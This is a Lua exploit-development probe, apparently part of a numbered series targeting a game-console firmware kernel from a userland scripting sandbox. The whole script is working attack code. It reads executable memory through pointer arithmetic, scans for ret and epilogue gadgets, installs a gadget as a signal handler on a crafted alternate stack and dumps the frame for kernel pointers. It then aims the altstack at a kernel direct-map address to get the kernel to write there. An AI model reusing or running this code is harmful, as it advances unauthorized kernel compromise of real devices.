-- 14.10 Recon Probe 26d: Find ret gadget in existing code
-- mprotect PROT_EXEC is blocked — can't create executable code
-- mmap RX gives executable zero page — useless
-- Need to find existing 0xC3 in the process's code segment
--
-- memory.read_byte with mmap'd RX page worked (read 0x00)
-- So we CAN read executable pages if we have a valid pointer
-- The crash in probe 26 was likely from passing a raw integer
--
-- Strategy: mmap at a FIXED address overlapping the code segment?
-- Or: use the RX mmap page's pointer arithmetic to reach code?
--
-- Actually simpler: memory.alloc returns pointers in the heap.
-- If we can compute an offset from heap to code, we can read code.
-- Or we can try reading via the RX page's base.
--
-- Alternative: the Lua API might support memory.read at arbitrary
-- addresses if we construct a pointer correctly.

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: FIND RET ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_mmap = 477,
    sc_munmap = 73,
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_kill = 37,
    sc_getpid = 20,
})

local pid = syscall.sc_getpid():tonumber()

-- ============================================================
-- PART 1: Understand pointer types and address layout
-- ============================================================
log("")
log("--- PART 1: address layout ---")

local heap1 = memory.alloc(64)
local heap2 = memory.alloc(64)
log(string.format("  heap1: 0x%x", heap1:tonumber()))
log(string.format("  heap2: 0x%x", heap2:tonumber()))

-- The crash handler is at 0x533118f4
-- Heap is probably in the 0x3xxxxxxxx range (from mmap results)
-- Let's see if we can do pointer arithmetic to reach code

-- Test: can we add a large offset to a heap pointer?
local heap_addr = heap1:tonumber()
local code_addr = 0x533118f4
local offset = code_addr - heap_addr
log(string.format("  crash handler: 0x%x", code_addr))
log(string.format("  offset to code: 0x%x (%d)", offset, offset))

-- Try reading with offset from heap pointer
local rd_ok, rd_val = pcall(function()
    return memory.read_byte(heap1 + offset):tonumber()
end)
log("  read code via offset: " .. (rd_ok and string.format("0x%02x", rd_val) or "FAIL"))

-- ============================================================
-- PART 2: If code readable, scan for ret near crash handler
-- ============================================================
log("")
log("--- PART 2: scan for ret ---")

if rd_ok then
    log("  *** CODE IS READABLE via pointer arithmetic ***")
    local code_base = heap1 + offset
    local rets = {}

    -- Scan crash handler region: -16 to +512
    for i = -16, 512 do
        local s_ok, s_val = pcall(function()
            return memory.read_byte(code_base + i):tonumber()
        end)
        if s_ok and s_val == 0xC3 then
            rets[#rets+1] = {off = i, addr = code_addr + i}
            log(string.format("  RET at 0x%x (handler+%d)", code_addr + i, i))
        end
    end
    log("  found " .. #rets .. " ret instructions")

    -- Also look for function epilogues
    for i = -16, 512 do
        local ok1, v1 = pcall(function() return memory.read_byte(code_base + i):tonumber() end)
        local ok2, v2 = pcall(function() return memory.read_byte(code_base + i + 1):tonumber() end)
        if ok1 and ok2 and v2 == 0xC3 then
            if v1 == 0x5D then -- pop rbp; ret
                log(string.format("  POP_RBP;RET at 0x%x", code_addr + i))
            elseif v1 == 0xC9 then -- leave; ret
                log(string.format("  LEAVE;RET at 0x%x", code_addr + i))
            end
        end
    end

    -- ============================================================
    -- PART 3: Test first ret gadget as signal handler
    -- ============================================================
    if #rets > 0 then
        log("")
        log("--- PART 3: test ret gadget ---")

        local gadget_off = rets[1].off
        local gadget_ptr = code_base + gadget_off -- pointer to the ret
        -- But we need the ADDRESS as an integer for sigaction
        local gadget_addr_int = rets[1].addr
        log(string.format("  using gadget at 0x%x", gadget_addr_int))

        -- Set up user altstack
        local STACK_SZ = 32768
        local test_stack = memory.alloc(STACK_SZ)
        for i = 0, STACK_SZ - 4, 4 do
            memory.write_dword(test_stack + i, 0x66660000 + i)
        end

        local ss_new = memory.alloc(32)
        local ss_old = memory.alloc(32)
        memory.write_qword(ss_new, test_stack)
        memory.write_qword(ss_new + 8, STACK_SZ)
        memory.write_dword(ss_new + 16, 0)
        pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

        -- Set SIGUSR1 handler to ret gadget
        local sa_new = memory.alloc(64)
        local sa_old = memory.alloc(64)
        for i = 0, 63, 8 do memory.write_qword(sa_new + i, 0) end
        local g_lo = gadget_addr_int % 0x100000000
        local g_hi = math.floor(gadget_addr_int / 0x100000000)
        memory.write_dword(sa_new, g_lo)
        memory.write_dword(sa_new + 4, g_hi)
        memory.write_dword(sa_new + 8, 0x0001 + 0x0040) -- SA_ONSTACK|SA_SIGINFO
        pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

        log("  sending SIGUSR1 to ret gadget...")
        local k_ok, k_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
        log("  kill rv=" .. (k_ok and tostring(k_ret:tonumber()) or "ERR"))

        local alive = pcall(function() return syscall.sc_getpid() end)
        log("  alive: " .. tostring(alive))

        if alive then
            local modified = 0
            local first_mod = -1
            for i = 0, STACK_SZ - 4, 4 do
                local v = memory.read_dword(test_stack + i):tonumber()
                if v ~= 0x66660000 + i then
                    modified = modified + 1
                    if first_mod < 0 then first_mod = i end
                end
            end
            log("  altstack modified: " .. modified)

            if modified > 0 then
                log("  *** RET GADGET WORKS — SIGNAL FRAME ON ALTSTACK ***")
                log(string.format("  frame starts at +%d", first_mod))

                -- Dump frame looking for kernel pointers
                for i = first_mod, math.min(first_mod + 384, STACK_SZ - 8), 8 do
                    local lo = memory.read_dword(test_stack + i):tonumber()
                    local hi = memory.read_dword(test_stack + i + 4):tonumber()
                    if hi ~= 0x66660000 + i + 4 or lo ~= 0x66660000 + i then
                        local tag = ""
                        if hi >= 0xFFFF0000 then tag = " ***KPTR***" end
                        if hi >= 0x00000053 and hi <= 0x00000054 then tag = " (code?)" end
                        log(string.format("    +%04x: 0x%08x%08x%s", i, hi, lo, tag))
                    end
                end

                -- ==========================================
                -- PART 4: KERNEL ALTSTACK + RET GADGET
                -- ==========================================
                log("")
                log("--- PART 4: KERNEL ALTSTACK ---")

                memory.write_dword(ss_new + 16, 4) -- SS_DISABLE
                pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

                memory.write_dword(ss_new, 0x10000000)
                memory.write_dword(ss_new + 4, 0xFFFFF800)
                memory.write_qword(ss_new + 8, STACK_SZ)
                memory.write_dword(ss_new + 16, 0)
                local kss = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
                log("  set kernel DMAP altstack: " .. tostring(kss))

                log("  *** SENDING SIGUSR1 WITH KERNEL ALTSTACK ***")
                local k2_ok, k2_ret = pcall(function()
                    return syscall.sc_kill(pid, 30)
                end)
                log("  kill rv=" .. (k2_ok and tostring(k2_ret:tonumber()) or "ERR"))

                local alive2 = pcall(function() return syscall.sc_getpid() end)
                log("  alive: " .. tostring(alive2))

                if alive2 then
                    log("  *** SURVIVED — copyout validated or wrote to kernel ***")
                else
                    log("  KILLED — kernel detected bad stack or wrote and crashed")
                end

                memory.write_dword(ss_new + 16, 4)
                pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
            end
        else
            log("  CRASHED — gadget didn't return cleanly")
            log("  trying next gadget...")
        end

        -- Cleanup
        for i = 0, 63, 8 do memory.write_qword(sa_new + i, 0) end
        pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
        memory.write_dword(ss_new + 16, 4)
        pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
    end
else
    log("  code NOT readable via pointer arithmetic")
    log("  trying MAP_FIXED to overlay code region...")

    -- Try mmap MAP_FIXED at crash handler page to get readable mapping
    local MAP_FIXED = 0x0010
    local code_page = 0x53311000 -- page containing 0x533118f4
    local mf_ok, mf_ret = pcall(function()
        return syscall.sc_mmap(code_page, 4096, 1 + 4, -- PROT_READ|PROT_EXEC
            MAP_PRIVATE + MAP_ANON + MAP_FIXED, -1, 0)
    end)
    log("  MAP_FIXED at code page: " ..
        (mf_ok and string.format("0x%x", mf_ret:tonumber()) or "ERR"))
end

log("")
log("=== FIND RET DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
